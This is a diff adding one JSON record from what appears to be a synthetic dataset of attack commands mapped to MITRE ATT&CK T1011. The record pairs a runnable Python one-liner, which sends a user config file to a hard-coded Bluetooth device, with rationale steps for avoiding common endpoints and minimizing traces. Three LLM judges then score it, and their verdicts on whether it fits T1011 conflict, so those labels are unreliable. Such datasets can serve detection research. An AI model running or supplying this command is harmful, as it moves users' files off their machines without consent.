@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('38:18:4C:AA:BB:CC', 0x1001)); p=os.path.expanduser('~/.config/user-dirs.dirs'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Exfiltrates via Bluetooth L2CAP on a dynamic PSM (0x1001), using a medium distinct from the primary communication channel in line with T1011.",
+  "rationale_steps": [
+    "Select Bluetooth L2CAP to leverage a non-IP transport path.",
+    "Connect to a dynamic PSM (0x1001) to avoid common service endpoints.",
+    "Read a user config file and send its raw bytes via L2CAP.",
+    "Close the socket promptly to minimize traces."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-3ac447bb",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced shell quoting and valid inline Python with correct socket construction, method calls, and separators.",
+        "semantic_score": 2,
+        "semantic_justification": "It plausibly exfiltrates a file over Bluetooth L2CAP, but this is a wireless network medium, not a physical removable medium as described for T1011 in the prompt.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T10:10:16.969327Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed Python code with balanced quotes, parentheses, and proper syntax for socket operations, file handling, and string manipulation.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements exfiltration over Bluetooth (a physical medium) by reading the user-dirs.dirs file and sending it to a specific Bluetooth MAC address, though it lacks encryption or obfuscation which would be typical for this technique.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T10:10:19.910452Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes, correct syntax for socket operations, file access, and variable assignments, making it immediately runnable.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command performs data exfiltration via Bluetooth (a physical wireless medium), T1011 'Exfiltration Over Physical Medium' specifically refers to transferring data *onto* a physical storage medium (like a USB drive) that is then *physically transported*, which is not what a direct Bluetooth transmission accomplishes.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T10:10:31.981033Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
